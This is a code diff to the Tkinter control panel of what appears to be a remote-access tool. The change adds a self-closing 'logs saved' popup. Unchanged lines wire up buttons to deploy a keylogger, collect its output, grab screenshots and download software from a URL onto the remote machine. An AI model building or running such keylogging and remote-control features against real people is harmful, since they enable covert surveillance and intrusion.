@@ -1,3 +1,4 @@
+import threading
 import tkinter
 import customtkinter
 from typing import Callable
@@ -14,26 +15,33 @@ customtkinter.set_default_color_theme("blue")  # Themes: blue (default), dark-bl
 layouts = []
 
 
+# Global Functions
+def Invoke(func: Callable, delay: float):
+    start = threading.Timer(delay, func)
+    start.start()
+
+
 # Custom CTk Frames
 
-class Popup:
-    def __init__(self, root: customtkinter.CTk, titleText="This is a popup", type="yn", geometry="400x200"):
-        """
+class Popups:
+    @staticmethod
+    def savedLogs(root: customtkinter.CTk, saveDirectory:str = "PyRemoteClient/logs", geometry: str ="450x200"):
+        def closeWindow():
+            window.destroy()
+            window.update()
 
-        :param baseWindow:
-        :param titleText:
-        :param type:
-        """
-        self.root = root
-        self.titleText = titleText
-        self.types = {
-            "yn": {},
-            "dialog": {}
-            }
-        self.type = type
+        Invoke(closeWindow, 3)
 
-        self.window = customtkinter.CTkToplevel(self.root)
-        self.window.geometry(geometry)
+        window: customtkinter.CTkToplevel = customtkinter.CTkToplevel(root)
+        #window.geometry(geometry)
+        window.title("Log(s) saved!")
+        window.resizable(False, False)
+
+        title = customtkinter.CTkLabel(window, text=f"File(s) Saved to: {saveDirectory}", font=customtkinter.CTkFont(size=20, weight="bold"))
+        title.grid(row=0, column=0, padx=20, pady=10)
+
+        quitButton = customtkinter.CTkButton(window, text="Exit", command=closeWindow)
+        quitButton.grid(row=1, column=0, padx=20, pady=10)
 
 
 class Frame(customtkinter.CTkFrame):    # Just here to avoid repeating adding layouts
@@ -221,7 +229,6 @@ class App(customtkinter.CTk):
         pilscreenshot.save(f"{MAINFOLDER}Screenshots/{time.strftime('%d-%m-%Y')}.png")
         pilscreenshot = pilscreenshot.resize((400, 200))
         self.ssFrame.screenshot.configure(dark_image=pilscreenshot, light_image=pilscreenshot)
-        Popup(self)
 
     def takeCapture(self):
         self.client.capture()
@@ -239,9 +246,9 @@ class App(customtkinter.CTk):
     def keyloggerDeployWrapper(self):
         self.client.deployKeylogger()
 
-    def getKeyloggerOutputWrapper(self) -> str:
+    def getKeyloggerOutputWrapper(self) -> None:
+        Popups.savedLogs(self)
         return self.client.getKeyloggerOutput()
-
     def downloadSoftwareWrapper(self):
         self.client.downloadSoftware(self.downloaderFrame.url.get())
 
